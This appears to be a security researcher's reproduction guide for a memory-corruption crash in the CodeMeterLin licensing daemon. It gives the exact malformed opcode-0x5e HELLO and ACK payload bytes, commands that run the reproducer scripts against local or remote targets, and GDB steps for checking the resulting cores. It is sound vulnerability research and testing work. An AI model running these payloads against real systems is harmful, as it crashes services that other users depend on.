# Reproducing The Opcode-0x5e SAMC Crash

This document gives the current reproduction procedures for the
`CodeMeterLin+0x8f431d` crash. There are two practical routes into the same
crash class:

1. A one-frame fresh HELLO route.
2. A two-frame post-HELLO ACK route.

Both routes build valid encrypted SAMC frames. The daemon decrypts them
normally; the parser-visible application plaintext starts with opcode `0x5e`
and reaches the vulnerable tag-`0x5e` parser class.

## Target

Validated against:

- Package: `CodeMeter-8.40.7154-505.x86_64`
- CodeMeterLin build: 8.40e of 2026-Mar-06 / Build 7154
- Binary sha256:
  `6bf82aa09b7f9696b4bf7535a7cb9a2fee62be5220952f2c237b6c73cbe09917`
- Host OS: openSUSE Tumbleweed, x86_64

## Prerequisites

- `CodeMeterLin` listening on `127.0.0.1:22350`, or a reachable non-loopback
  target for the ECDH channel.
- Python 3 with `cryptography`.
- Optional but recommended: raw core collection enabled under
  `/var/tmp/cm_cores`.

Confirm a local daemon is listening:

```bash
systemctl is-active codemeter
ss -tln '( sport = :22350 )'
pgrep -x CodeMeterLin
```

Run these repros only on a disposable target. They intentionally crash the
daemon.

## Route 1: Prefixed HELLO

The import-based reproducer is:

```bash
python3 fuzzer/repro_prefixed_hello.py
```

The standalone reproducer, with no project-local imports or captured session
data, is:

```bash
python3 fuzzer/repro_prefixed_hello_standalone.py
```

The current default cleartext shape is:

```text
5e 00 00 00 00 || canonical HELLO with fresh client token
```

The shifted cleartext begins:

```text
5e 00 00 00 00 0a 00 00 00 00 00 00 10 00 00 28
```

When parsed as little-endian words by the vulnerable path:

```text
0x0000005e
0x00000a00
0x00000000
0x28000010
```

The word at cleartext offset `0x0c`, `0x28000010`, is stored into the parser
object at `this+0x68` and reaches the memcpy length at
`CodeMeterLin+0x8f431d`.

Dry-run output should include:

```text
prefix_hex=5e00000000
prefix_len=5
mutated_hello_len=189
mutated_hello_head=5e000000000a00000000000010000028
word_at_cleartext_offset_0x0c=0x28000010
matches_expected_bad_len=True
```

For a non-loopback target, use the ECDH-selected channel:

```bash
python3 fuzzer/repro_prefixed_hello.py --host TARGET
python3 fuzzer/repro_prefixed_hello_standalone.py --host TARGET
```

The older historical prefix is still supported:

```bash
python3 fuzzer/repro_prefixed_hello.py --prefix 5e355ed6f2
python3 fuzzer/repro_prefixed_hello_standalone.py --prefix 5e355ed6f2
```

That prefix was the first deterministic reduction, but later fuzzing showed
the random-looking tail is not special.

## Route 2: Prefixed ACK

The standalone ACK-side repro is:

```bash
python3 fuzzer/repro_prefixed_ack_standalone.py
```

It does this:

1. Build and send a normal fresh-token HELLO.
2. Decrypt the daemon response and extract the live 4-byte SID.
3. Build the canonical ACK as `0b000000 || SID`.
4. Prepend the simplified opcode-`0x5e` zero-tail prefix.
5. Send the mutated ACK as the second application frame.

The default mutated ACK plaintext shape is:

```text
5e0000000000000000000000000000 || 0b000000 || SID
```

With a dry-run SID of zero, the packet summary should include:

```text
prefix_hex=5e0000000000000000000000000000
prefix_len=15
canonical_ack_len=8
canonical_ack_hex=0b00000000000000
mutated_ack_len=23
mutated_ack_hex=5e00000000000000000000000000000b00000000000000
mutated_ack_starts_with_0x5e=True
```

For the import-based ACK repro:

```bash
python3 fuzzer/repro_ack_0x5e.py
```

It also supports non-loopback targets by auto-selecting the ECDH channel:

```bash
python3 fuzzer/repro_ack_0x5e.py --host TARGET
```

`repro_ack_0x5e.py` also supports older captured random-tail samples:

```bash
python3 fuzzer/repro_ack_0x5e.py --sample-prefix 1
```

## Expected Crash Evidence

On a local target, success is any of:

- the `CodeMeterLin` PID exits or changes;
- the listener on `:22350` disappears;
- a new `core.CodeMeterLin.*` appears under `/var/tmp/cm_cores`;
- the reproducer reports `crashed=True`.

If systemd restarts CodeMeter automatically, `after_pid` may be a new PID
instead of `None`. Treat either a PID change or a new core as success.

Restart the daemon after reproducing:

```bash
sudo systemctl start codemeter
```

## Core Validation

Minimal GDB validation for a produced core:

```bash
sudo gdb -q -nx -batch \
  -ex 'set debuginfod enabled off' \
  -ex 'bt' \
  -ex 'info registers rip rbx rbp r12 r14 rsi rdi r15' \
  -ex 'p/x $_siginfo._sifields._sigfault.si_addr' \
  -ex 'frame 3' \
  -ex 'info registers rbx r15' \
  -ex 'x/8wx $rbx' \
  -ex 'x/16wx $r15+0x60' \
  /usr/sbin/CodeMeterLin /var/tmp/cm_cores/core.CodeMeterLin.<pid>.<time>
```

Expected facts:

```text
#0 libc __memmove_evex_unaligned_erms
#1 CodeMeterLin+0x8f431d
rbx = large copy length

For the default HELLO repro:
  parser-visible word at cleartext +0x0c = 0x28000010
  parser object this+0x68 = 0x28000010

For the default ACK repro:
  parser-visible word at cleartext +0x0c = 0x0b000000
  parser object this+0x68 = 0x0b000000
```

The ACK route converges on the same stack/signature, but the parser-visible
payload before the canonical ACK is shorter and session-dependent because the
SID is extracted live from the HELLO response.

The 2026-04-22 full-core rerun captured sparse ELF cores for all four
reproducers under:

```text
/var/tmp/cm_full_core_capture_20260422_090148/cores
```

Those cores confirm that the HELLO and ACK routes differ only in the bad
length value (`0x28000010` vs `0x0b000000`); both use the same opcode-`0x5e`
parser and the same unchecked copy path.

## Historical Attribution Run

The first deterministic HELLO was isolated with
`fuzzer/samc_light_supervisor.py`:

```bash
python3 fuzzer/samc_light_supervisor.py \
  --out-dir /home/avj/clones/ax_fuzz/output/light_supervisor_mixed2_$(date +%Y%m%d_%H%M%S) \
  --workers 16 \
  --mode mixed \
  --iterations 10000000 \
  --ring-size 100 \
  --seed-base 0xC0D30000 \
  --timeout 900
```

The successful attribution run stopped after 49,944 attempts and preserved the
triggering attempt at:

```text
/home/avj/clones/ax_fuzz/output/light_supervisor_mixed2_20260421_103043/worker_09/ring/iter_00004667/
```

Attempt metadata:

```text
target frame: 0 (HELLO)
mutation:     insert_rand
insert pos:   0
insert bytes: 5e355ed6f2
```

That historical prefix remains useful for provenance and regression testing.
The simplified zero-tail HELLO and ACK repros are the preferred current tests.
